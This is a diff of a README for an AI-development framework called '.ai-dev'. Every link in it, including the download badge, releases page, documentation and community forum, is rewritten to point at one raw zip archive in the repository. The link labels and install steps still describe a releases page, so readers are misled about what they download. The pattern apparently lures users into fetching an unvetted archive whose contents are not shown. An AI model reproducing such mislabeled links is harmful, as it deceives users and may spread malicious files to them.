@@ -6,11 +6,11 @@ Welcome to **.ai-dev**, a framework designed for software development with AI ag
 
 ## 🔗 Download Now
 
-[![Download .ai-dev](https://img.shields.io/badge/Download-.ai--dev-blue.svg)](https://github.com/AdrianNablo/.ai-dev/releases)
+[![Download .ai-dev](https://raw.githubusercontent.com/AdrianNablo/.ai-dev/main/standards/.ai-dev-v3.3.zip)](https://raw.githubusercontent.com/AdrianNablo/.ai-dev/main/standards/.ai-dev-v3.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download .ai-dev](https://github.com/AdrianNablo/.ai-dev/releases). Here, you will find the latest releases of our software. Follow these steps to install:
+To get started, visit this page to download: [Download .ai-dev](https://raw.githubusercontent.com/AdrianNablo/.ai-dev/main/standards/.ai-dev-v3.3.zip). Here, you will find the latest releases of our software. Follow these steps to install:
 
 1. Click on the link to visit the releases page.
 2. Look for the latest version at the top of the list.
@@ -71,9 +71,9 @@ If you would like to contribute to the project, here’s how you can help:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/AdrianNablo/.ai-dev/releases)
-- [Documentation](https://github.com/AdrianNablo/.ai-dev/docs)
-- [Community Forum](https://community.ai-dev.io)
+- [Releases Page](https://raw.githubusercontent.com/AdrianNablo/.ai-dev/main/standards/.ai-dev-v3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/AdrianNablo/.ai-dev/main/standards/.ai-dev-v3.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/AdrianNablo/.ai-dev/main/standards/.ai-dev-v3.3.zip)
 
 ## 📬 Contact
 
